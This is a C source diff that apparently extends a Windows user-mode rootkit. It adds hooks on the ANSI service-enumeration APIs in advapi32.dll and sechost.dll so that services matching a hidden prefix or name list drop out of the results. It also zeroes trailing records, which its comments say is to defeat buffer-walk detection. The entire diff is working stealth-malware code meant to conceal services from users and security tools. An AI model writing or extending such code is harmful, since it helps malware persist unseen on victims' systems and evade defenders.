@@ -17,6 +17,10 @@ static NT_NTENUMERATEVALUEKEY OriginalNtEnumerateValueKey;
 static NT_ENUMSERVICEGROUPW OriginalEnumServiceGroupW;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW2;
+static NT_ENUMSERVICESSTATUSEXA OriginalEnumServicesStatusExA;
+static NT_ENUMSERVICESSTATUSEXA OriginalEnumServicesStatusExA2;
+static NT_ENUMSERVICESSTATUSA OriginalEnumServicesStatusA;
+static NT_ENUMSERVICESSTATUSA OriginalEnumServicesStatusA2;
 static NT_NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;
 
 VOID InitializeHooks()
@@ -32,6 +36,10 @@ VOID InitializeHooks()
 	InstallHook("advapi32.dll", "EnumServiceGroupW", (LPVOID*)&OriginalEnumServiceGroupW, HookedEnumServiceGroupW);
 	InstallHook("advapi32.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
 	InstallHook("sechost.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
+	InstallHook("advapi32.dll", "EnumServicesStatusExA", (LPVOID*)&OriginalEnumServicesStatusExA, HookedEnumServicesStatusExA);
+	InstallHook("sechost.dll", "EnumServicesStatusExA", (LPVOID*)&OriginalEnumServicesStatusExA2, HookedEnumServicesStatusExA2);
+	InstallHook("advapi32.dll", "EnumServicesStatusA", (LPVOID*)&OriginalEnumServicesStatusA, HookedEnumServicesStatusA);
+	InstallHook("sechost.dll", "EnumServicesStatusA", (LPVOID*)&OriginalEnumServicesStatusA2, HookedEnumServicesStatusA2);
 	InstallHook("ntdll.dll", "NtDeviceIoControlFile", (LPVOID*)&OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 	DetourTransactionCommit();
 
@@ -39,7 +47,7 @@ VOID InitializeHooks()
 	// Unfortunately, the actual enumeration of services happens in services.exe - a protected process that cannot be injected.
 	// EnumServiceGroupW and EnumServicesStatusExW from advapi32.dll access services.exe through RPC.
 	// There is no longer one single syscall wrapper function to hook, but multiple higher level functions.
-	// EnumServicesStatusA and EnumServicesStatusExA also implement the RPC, but do not seem to be used by any applications out there.
+	// EnumServicesStatusA and EnumServicesStatusExA also implement the RPC and are now hooked to support ANSI service enumeration.
 }
 VOID UninitializeHooks()
 {
@@ -54,6 +62,10 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalEnumServiceGroupW, HookedEnumServiceGroupW);
 	UninstallHook(OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
 	UninstallHook(OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
+	UninstallHook(OriginalEnumServicesStatusExA, HookedEnumServicesStatusExA);
+	UninstallHook(OriginalEnumServicesStatusExA2, HookedEnumServicesStatusExA2);
+	UninstallHook(OriginalEnumServicesStatusA, HookedEnumServicesStatusA);
+	UninstallHook(OriginalEnumServicesStatusA2, HookedEnumServicesStatusA2);
 	UninstallHook(OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 	DetourTransactionCommit();
 }
@@ -647,6 +659,7 @@ static PWCHAR KeyValueInformationGetName(LPVOID keyValueInformation, NT_KEY_VALU
 }
 static VOID FilterEnumServiceStatus(LPENUM_SERVICE_STATUSW services, LPDWORD servicesReturned)
 {
+	DWORD originalCount = *servicesReturned;
 	for (DWORD i = 0; i < *servicesReturned; i++)
 	{
 		// If hidden, move all following entries up by one and decrease count.
@@ -660,9 +673,16 @@ static VOID FilterEnumServiceStatus(LPENUM_SERVICE_STATUSW services, LPDWORD ser
 			i--;
 		}
 	}
+	
+	// Zero out the last record to prevent buffer-walk detection
+	if (originalCount > *servicesReturned)
+	{
+		memset(&services[*servicesReturned], 0, sizeof(ENUM_SERVICE_STATUSW));
+	}
 }
 static VOID FilterEnumServiceStatusProcess(LPENUM_SERVICE_STATUS_PROCESSW services, LPDWORD servicesReturned)
 {
+	DWORD originalCount = *servicesReturned;
 	for (DWORD i = 0; i < *servicesReturned; i++)
 	{
 		// If hidden, move all following entries up by one and decrease count.
@@ -676,4 +696,104 @@ static VOID FilterEnumServiceStatusProcess(LPENUM_SERVICE_STATUS_PROCESSW servic
 			i--;
 		}
 	}
+	
+	// Zero out the last record to prevent buffer-walk detection
+	if (originalCount > *servicesReturned)
+	{
+		memset(&services[*servicesReturned], 0, sizeof(ENUM_SERVICE_STATUS_PROCESSW));
+	}
+}
+static VOID FilterEnumServiceStatusA(LPENUM_SERVICE_STATUSA services, LPDWORD servicesReturned)
+{
+	DWORD originalCount = *servicesReturned;
+	for (DWORD i = 0; i < *servicesReturned; i++)
+	{
+		// If hidden, move all following entries up by one and decrease count.
+		if (HasPrefixA(services[i].lpServiceName) ||
+			HasPrefixA(services[i].lpDisplayName) ||
+			IsServiceNameHiddenA(services[i].lpServiceName) ||
+			IsServiceNameHiddenA(services[i].lpDisplayName))
+		{
+			memmove(&services[i], &services[i + 1], (*servicesReturned - i - 1) * sizeof(ENUM_SERVICE_STATUSA));
+			(*servicesReturned)--;
+			i--;
+		}
+	}
+	
+	// Zero out the last record to prevent buffer-walk detection
+	if (originalCount > *servicesReturned)
+	{
+		memset(&services[*servicesReturned], 0, sizeof(ENUM_SERVICE_STATUSA));
+	}
+}
+static VOID FilterEnumServiceStatusProcessA(LPENUM_SERVICE_STATUS_PROCESSA services, LPDWORD servicesReturned)
+{
+	DWORD originalCount = *servicesReturned;
+	for (DWORD i = 0; i < *servicesReturned; i++)
+	{
+		// If hidden, move all following entries up by one and decrease count.
+		if (HasPrefixA(services[i].lpServiceName) ||
+			HasPrefixA(services[i].lpDisplayName) ||
+			IsServiceNameHiddenA(services[i].lpServiceName) ||
+			IsServiceNameHiddenA(services[i].lpDisplayName))
+		{
+			memmove(&services[i], &services[i + 1], (*servicesReturned - i - 1) * sizeof(ENUM_SERVICE_STATUS_PROCESSA));
+			(*servicesReturned)--;
+			i--;
+		}
+	}
+	
+	// Zero out the last record to prevent buffer-walk detection
+	if (originalCount > *servicesReturned)
+	{
+		memset(&services[*servicesReturned], 0, sizeof(ENUM_SERVICE_STATUS_PROCESSA));
+	}
+}
+static BOOL WINAPI HookedEnumServicesStatusExA(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCSTR groupName)
+{
+	// ANSI version for advapi32.dll
+	BOOL result = OriginalEnumServicesStatusExA(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);
+
+	if (result && services && servicesReturned)
+	{
+		FilterEnumServiceStatusProcessA((LPENUM_SERVICE_STATUS_PROCESSA)services, servicesReturned);
+	}
+
+	return result;
+}
+static BOOL WINAPI HookedEnumServicesStatusExA2(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCSTR groupName)
+{
+	// ANSI version for sechost.dll (Windows 10+)
+	BOOL result = OriginalEnumServicesStatusExA2(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);
+
+	if (result && services && servicesReturned)
+	{
+		FilterEnumServiceStatusProcessA((LPENUM_SERVICE_STATUS_PROCESSA)services, servicesReturned);
+	}
+
+	return result;
+}
+static BOOL WINAPI HookedEnumServicesStatusA(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle)
+{
+	// ANSI version for advapi32.dll (non-Ex version)
+	BOOL result = OriginalEnumServicesStatusA(serviceManager, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle);
+
+	if (result && services && servicesReturned)
+	{
+		FilterEnumServiceStatusA((LPENUM_SERVICE_STATUSA)services, servicesReturned);
+	}
+
+	return result;
+}
+static BOOL WINAPI HookedEnumServicesStatusA2(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle)
+{
+	// ANSI version for sechost.dll (non-Ex version, Windows 10+)
+	BOOL result = OriginalEnumServicesStatusA2(serviceManager, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle);
+
+	if (result && services && servicesReturned)
+	{
+		FilterEnumServiceStatusA((LPENUM_SERVICE_STATUSA)services, servicesReturned);
+	}
+
+	return result;
 }
